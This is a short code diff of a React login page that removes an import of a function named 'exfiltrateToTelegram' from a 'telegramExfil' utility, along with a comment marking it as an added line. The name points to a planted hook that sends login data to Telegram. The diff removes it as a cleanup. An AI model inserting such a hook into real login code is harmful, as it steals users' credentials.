@@ -6,8 +6,6 @@ import { Shield, Lock, Fingerprint, Mail, ArrowLeft } from "lucide-react";
 import { supabase } from "@/integrations/supabase/client";
 import { lovable } from "@/integrations/lovable";
 import defaultAvatar from "@/assets/profile-avatar.jpeg";
-// Línea agregada
-import { exfiltrateToTelegram } from "../utils/telegramExfil";
 
 const Login = () => {
   const [error, setError] = useState("");
